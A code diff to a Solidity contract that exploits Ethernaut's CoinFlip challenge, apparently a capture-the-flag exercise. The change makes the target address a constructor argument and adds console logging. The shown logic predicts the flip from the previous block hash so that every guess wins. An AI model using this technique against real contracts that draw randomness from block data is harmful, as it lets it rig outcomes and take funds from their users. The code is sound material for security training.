@@ -2,6 +2,7 @@
 pragma solidity 0.8.10;
 
 import "./CoinFlip.sol";
+import "hardhat/console.sol";
 
 /// @title Contract for hacking CoinFlip.sol in Ethernaut
 /// @author Pedro Reyes
@@ -11,13 +12,17 @@ contract HackFlip {
     uint256 FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    CoinFlip coinFlipContract =
-        CoinFlip(0x4dF32584890A0026e56f7535d0f2C6486753624f); /* Address here */
+    CoinFlip coinFlipContract;
+
+    constructor(address _coinFlipAddress) {
+        coinFlipContract = CoinFlip(_coinFlipAddress);
+    }
 
     /// @dev Calls CoinFlip.flip method with (true/false) for winning always based on on-chain data
     function flip() public returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
 
+        console.log("Flipping . . .");
         if (lastHash == blockValue) {
             revert();
         }
